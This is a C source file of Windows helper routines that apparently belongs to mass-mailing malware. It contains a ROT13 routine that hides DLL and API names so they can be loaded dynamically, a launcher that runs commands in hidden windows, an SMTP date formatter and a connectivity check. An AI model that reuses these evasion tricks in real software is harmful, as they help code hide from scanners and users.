#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <string.h>

char k1(char c);
void k(char *buf, const char *in);
void mk_smtpdate(FILETIME *in_ft, char *buf);
void xrand_init(void);
WORD xrand16(void);
DWORD xrand32(void);
char *xstrstr(const char *str, const char *pat);
char *xstrrchr(const char *str, char ch);
char *xstrchr(const char *str, char ch);
int xsystem(char *cmd, int wait);
int xmemcmpi(unsigned char *, unsigned char *, int);
int xstrncmp(const char *first, const char *last, size_t count);
int html_replace(char *);
int html_replace2(char *);
int is_online(void);
int cat_wsprintf(LPTSTR lpOutput, LPCTSTR lpFormat, ...);

char k1(char c)
{
	char u[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	char l[] = "abcdefghijklmnopqrstuvwxyz";
	char *p;

	if ((p = xstrchr(u, c)) != NULL)
		return u[((p-u) + 13) % 26];
	else if ((p = xstrchr(l, c)) != NULL)
		return l[((p-l) + 13) % 26];
	else
		return c;
}

void k(char *buf, const char *in)
{
	while (*in)
		*buf++ = k1(*in++);
	*buf = 0;
}

void mk_smtpdate(FILETIME *in_ft, char *buf)
{
        SYSTEMTIME t;
	TIME_ZONE_INFORMATION tmz_info;
	DWORD daylight_flag; int utc_offs, utc_offs_u;
        LPSTR weekdays[7] = { "Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat" };
        LPSTR months[12] = { "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec" };

	if (in_ft == NULL) {
	        GetLocalTime(&t);
	} else {
		FILETIME lft;
		FileTimeToLocalFileTime(in_ft, &lft);
		FileTimeToSystemTime(&lft, &t);
	}

	tmz_info.Bias = 0;
	daylight_flag = GetTimeZoneInformation(&tmz_info);

	utc_offs = tmz_info.Bias;
	if (daylight_flag == TIME_ZONE_ID_DAYLIGHT) utc_offs += tmz_info.DaylightBias;
	utc_offs = -utc_offs;
	utc_offs_u = (utc_offs >= 0) ? utc_offs : -utc_offs;

        if (t.wDayOfWeek > 6) t.wDayOfWeek = 6;
        if (t.wMonth == 0) t.wMonth = 1;
        if (t.wMonth > 12) t.wMonth = 12;

        wsprintf(buf,
                "%s, %u %s %u %.2u:%.2u:%.2u %s%.2u%.2u",
                weekdays[t.wDayOfWeek], t.wDay,
                months[t.wMonth-1], t.wYear,
                t.wHour, t.wMinute, t.wSecond,
		(utc_offs >= 0) ? "+" : "-",
		utc_offs_u / 60, utc_offs_u % 60
        );
}

static DWORD xrand16_seed;

void xrand_init(void)
{
	xrand16_seed = GetTickCount();
}

WORD xrand16(void)
{
	xrand16_seed = 0x015a4e35L * xrand16_seed + 1L;
	return ((WORD)(xrand16_seed >> 16L) & (WORD)0xffff);
}

DWORD xrand32(void)
{
	return xrand16() | (xrand16() << 16);
}

char *xstrstr(const char *str, const char *pat)
{
	const char *p, *q;
	for (; *str; str++) {
		for (p=str, q=pat; *p && *q; p++, q++)
			if (*p != *q) break;
		if (p == q || *q == 0) return (char *)str;
	}
	return NULL;
}

char *xstrrchr(const char *str, char ch)
{
	register char *start = (char *)str;
	while (*str++);
	while (--str != start && *str != ch);
	if (*str == (char)ch) return((char *)str);
	return NULL;
}

char *xstrchr(const char *str, char ch)
{
	while (*str && *str != ch) str++;
	return (*str == ch) ? (char *)str : NULL;
}

int xsystem(char *cmd, int wait)
{
	PROCESS_INFORMATION pi; 
	STARTUPINFO si; 

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_FORCEOFFFEEDBACK;
	si.wShowWindow = SW_HIDE;

	if (CreateProcess(0, cmd, 0, 0, TRUE, 0, 0, 0, &si, &pi) == 0)
		return 1;	/* FAILED */

	if (wait) {
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}

	return 0;		/* SUCCESS */
}


int xstrncmp(const char *first, const char *last, size_t count)
{
        if (!count)
                return(0);

        while (--count && *first && *first == *last)
        {
                first++;
                last++;
        }

        return (*(unsigned char *)first - *(unsigned char *)last);
}

/* "&#<number>" -> ascii */

typedef BOOL (WINAPI *WININET_GETCONNECTEDSTATE)(LPDWORD lpdwFlags, DWORD dwReserved);

/* Returns: 0=offline, 1=online, 2=don't know */
int is_online(void)
{
	WININET_GETCONNECTEDSTATE pInternetGetConnectedState;
	HINSTANCE hWinInet;
	DWORD igcs_flags;
	char tmp[64];

	k(tmp, "jvavarg.qyy");                /* "wininet.dll" */
	hWinInet = GetModuleHandle(tmp);
	if (hWinInet == NULL || hWinInet == INVALID_HANDLE_VALUE) {
		hWinInet = LoadLibrary(tmp);
		if (hWinInet == NULL || hWinInet == INVALID_HANDLE_VALUE)
			return 2;
	}

	k(tmp, "VagreargTrgPbaarpgrqFgngr");  /* "InternetGetConnectedState" */
	pInternetGetConnectedState = (WININET_GETCONNECTEDSTATE)GetProcAddress(hWinInet, tmp);
	if (pInternetGetConnectedState == NULL)
		return 2;

	return (pInternetGetConnectedState(&igcs_flags, 0) == 0) ? 0 : 1;
}

int cat_wsprintf(LPTSTR lpOutput, LPCTSTR lpFormat, ...)
{
        register int ret;
        va_list arglist;
        va_start(arglist, lpFormat);
        ret = wvsprintf(lpOutput + lstrlen(lpOutput), lpFormat, arglist);
        va_end(arglist);
        return ret;
}
